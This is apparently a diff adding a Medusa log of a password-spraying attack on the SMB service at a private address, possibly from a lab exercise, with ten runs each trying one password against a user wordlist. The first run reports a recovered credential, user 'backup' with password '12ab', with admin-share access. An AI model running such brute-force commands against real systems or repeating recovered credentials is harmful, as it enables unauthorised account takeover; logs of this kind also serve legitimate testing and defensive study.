@@ -1,0 +1,31 @@
+# Medusa v.2.3 (2026-10-29 15:11:36)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 12ab -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+2026-10-29 15:11:36 ACCOUNT FOUND: [smbnt] Host: 172.28.0.12 User: backup Password: 12ab [SUCCESS (ADMIN$ - Share Unavailable)]
+# Medusa has finished (2026-10-29 15:11:36).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 34cd -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:37)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 56ef -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:37).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 78gh -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 90ij -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:38)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 01kl -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:38).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 23mn -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+# Medusa v.2.3 (2026-10-29 15:11:39)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 45op -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:39).
+# Medusa v.2.3 (2026-10-29 15:11:40)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 67qr -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:40).
+# Medusa v.2.3 (2026-10-29 15:11:40)
+# medusa -h 172.28.0.12 -U /wordlists/trial1-users.txt -p 89st -M smbnt -m GROUP:LOCAL -m AUTH:LMv2 -m MODE:AUTO -t 1 -O /logs/medusa-smb-20261029-121135.log 
+# Medusa has finished (2026-10-29 15:11:40).
